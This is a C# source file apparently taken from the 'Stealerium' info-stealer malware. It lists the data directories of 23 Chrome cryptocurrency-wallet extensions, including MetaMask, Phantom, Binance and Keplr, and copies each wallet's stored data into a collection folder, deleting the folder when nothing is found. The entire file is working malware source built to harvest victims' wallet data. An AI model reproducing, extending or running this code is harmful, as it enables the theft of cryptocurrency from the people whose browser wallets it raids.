using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Chromium
{
    internal class Extensions
    {
        private static readonly List<string[]> ChromeWalletsDirectories = new List<string[]>
        {
            new[]
            {
                "Chrome_Binance",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"
            },
            new[]
            {
                "Chrome_Bitapp",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"
            },
            new[]
            {
                "Chrome_Coin98",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"
            },
            new[]
            {
                "Chrome_Equal",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"
            },
            new[]
            {
                "Chrome_Guild",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"
            },
            new[]
            {
                "Chrome_Iconex",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"
            },
            new[]
            {
                "Chrome_Math",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"
            },
            new[]
            {
                "Chrome_Mobox",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"
            },
            new[]
            {
                "Chrome_Phantom",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"
            },
            new[]
            {
                "Chrome_Tron",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"
            },
            new[]
            {
                "Chrome_XinPay",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"
            },
            new[]
            {
                "Chrome_Ton",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"
            },
            new[]
            {
                "Chrome_Metamask",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
            },
            new[]
            {
                "Chrome_Sollet",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"
            },
            new[]
            {
                "Chrome_Slope",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"
            },
            new[]
            {
                "Chrome_Starcoin",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"
            },
            new[]
            {
                "Chrome_Swash",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"
            },
            new[]
            {
                "Chrome_Finnie",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"
            },
            new[]
            {
                "Chrome_Keplr",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"
            },
            new[]
            {
                "Chrome_Crocobit",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"
            },
            new[]
            {
                "Chrome_Oxygen",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"
            },
            new[]
            {
                "Chrome_Nifty",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"
            },
            new[]
            {
                "Chrome_Liquality",
                Paths.Lappdata +
                "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"
            }
        };

        public static void GetChromeWallets(string sSaveDir)
        {
            try
            {
                Directory.CreateDirectory(sSaveDir);

                foreach (var array in ChromeWalletsDirectories) CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]);
                if (Counter.BrowserWallets == 0) Filemanager.RecursiveDelete(sSaveDir);
            }
            catch (Exception ex)
            {
                Logging.Log("Chrome Browser Wallets >> Failed to collect wallets from Chrome browser\n" + ex);
            }
        }

        // Copy wallet files to directory
        private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
        {
            var sdir = Path.Combine(sSaveDir, sWalletName);
            if (!Directory.Exists(sWalletDir)) return;
            Filemanager.CopyDirectory(sWalletDir, sdir);
            Counter.BrowserWallets++;
        }
    }
}